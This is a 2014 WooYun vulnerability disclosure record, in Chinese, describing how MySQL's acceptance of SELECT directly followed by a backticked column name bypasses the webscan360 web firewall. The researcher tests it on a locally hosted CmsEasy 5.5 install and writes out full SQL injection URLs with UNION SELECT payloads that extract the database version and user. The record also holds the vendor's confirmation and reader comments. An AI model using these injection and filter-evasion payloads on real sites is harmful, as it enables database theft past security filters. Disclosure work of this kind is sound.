{"id": 47814, "wybug_id": "wooyun-2014-079654", "wybug_title": "mysql一个特性绕过webscan360导致sql完美执行", "wybug_corp": "奇虎360", "wybug_author": "menmen519", "wybug_date": "2014-10-16 20:33", "wybug_open_date": "2015-01-14 20:34", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向公众公开  简要描述： mysql一个特性绕过webscan360 导致sql完美执行 详细说明：  这里我们就要说一下，最新版本的cmseasy了 我们首先测试一个东西，在mysql中select `tname`,1,2,3,4 from `table` 这个东西想必大家都会认同，可以执行那么我们去掉select和`tname`之间的空格，看看这样的语句还能否执行这里我们用cmseasy的数据库测试一下SELECT`catid` FROM `cmseasy_archive` WHERE 1\n\n看到了没有完美执行了 在之前审核cmseasy的时候第一次union select 1,2,3,4 from `t`   是自动会被webscan360拦截第二次union select/**/1,2,3,4 from `t` 这个绕过了webscan360成功执行第三次这个地方被修补了上次绕过webscan360的问题，这里我们再次测试第二次的情况会被拦截，我们不做演示了，那么我们的猜想是否正确union select`tname`,1,2,3,4 from `t` 这个也应该会成功执行直接看代码：archive_act.php:\n} elseif (front::get(front::check_type('aid'))){        \t            $this->view->archive = archive::getInstance()->getrow(front::get('aid'));            $this->view->categorys = category::getpositionlink2($this->view->archive['catid']);            $this->view->paylist = pay::getInstance()->getrows('', 50);            $this->view->logisticslist = logistics::getInstance()->getrows('', 50);\t\t\t$prices = getPrices($this->view->archive['attr2']);            $this->view->archive['attr2'] = $prices['price'];            if (!is_array($this->view->archive))                $this->out('message/error.html');            if ($this->view->archive['checked'] < 1)                exit(lang('未审核！'));            if (!rank::arcget(front::get('aid'), $this->view->usergroupid)) {                $this->out('message/error.html');            }\n这里对front::get(front::check_type('aid') 这个进行了处理，故而漏洞已经修复，我们要测是的是webscan360，所以放过这里逻辑，改为：\n} elseif (true || front::get(front::check_type('aid'))){        \t            $this->view->archive = archive::getInstance()->getrow(front::get('aid'));            $this->view->categorys = category::getpositionlink2($this->view->archive['catid']);\n我们访问url:http://192.168.10.70/CmsEasy_5.5_UTF-8_20141015/uploads/index.php?case=archive&act=orders&aid[typeid%60%3d1%20UNION%20SELECT/**/1,2,3,concat(version(),user()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58  from cmseasy_archive ORDER BY 1%23]=1\n\n那么我们访问url:http://192.168.10.70/CmsEasy_5.5_UTF-8_20141015/uploads/index.php?case=archive&act=orders&aid[typeid%60%3d1%20UNION%20SELECT`typeid`,2,3,concat(version(),user()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58  from cmseasy_archive ORDER BY 1%23]=1\n\n成功绕过！！！！！！！！！   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-10-17 19:35 厂商回复： 感谢您对360网站安全检测服务的支持，已提交业务部门处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-16 20:36 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  这么吊    \n     2014-10-16 20:48 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  噗通~~    \n     2014-10-16 20:55 |    \t\t老笨蛋 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 老笨蛋一个)\t\t \n  太屌了。    \n     2014-10-16 22:36 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  大神!请收下我的膝盖    \n     2014-10-16 22:37 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  厉害！    \n     2014-10-16 23:23 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  这个不错    \n     2014-10-17 09:18 |    \t\tNeeke \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:24        | 求传授刷Rank方法？)\t\t \n  厉害    \n     2014-10-17 09:18 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  厉害！    \n     2014-10-17 09:43 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  屌    \n     2014-10-17 12:56 |    \t\t行者_travis \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 专职测试，安全测试。想搞搞其它的)\t\t \n  这个牛逼！    \n     2014-10-20 21:19 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-01-14 21:43 |    \t\t铁汉 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 向各种大神学习之)\t\t \n  你妹的，我要博文    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}